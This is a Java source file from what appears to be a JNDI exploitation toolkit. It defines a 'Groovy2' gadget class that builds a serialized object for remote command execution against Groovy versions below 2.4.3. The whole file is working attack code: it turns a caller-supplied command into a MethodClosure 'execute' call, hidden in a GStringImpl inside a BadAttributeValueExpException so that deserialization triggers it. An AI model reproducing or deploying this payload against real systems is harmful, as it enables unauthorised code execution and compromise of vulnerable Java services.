package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.gadgets.annotation.Authors;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.Reflections;
import org.codehaus.groovy.runtime.GStringImpl;
import org.codehaus.groovy.runtime.MethodClosure;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;

@Dependencies({"org.codehaus.groovy:groovy <2.4.3"})
@Authors({Authors.Unam4})
public class Groovy2 implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        MethodClosure  execute= (MethodClosure) Reflections.createWithoutConstructor("org.codehaus.groovy.runtime.MethodClosure");
        Reflections.setFieldValue(execute,"owner",command);
        Reflections.setFieldValue(execute,"method","execute");
        GStringImpl gString = new GStringImpl(new Object[]{execute},new String[]{"start"});
        try {
            Reflections.setFieldValue(execute,"maximumNumberOfParameters",0);
            Reflections.setFieldValue(execute,"ALLOW_RESOLVE",true);
        } catch (Exception e){
            Reflections.setFieldValue(execute,"maximumNumberOfParameters",0);
        }
        BadAttributeValueExpException val      = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, gString);
        return val;
    }

}
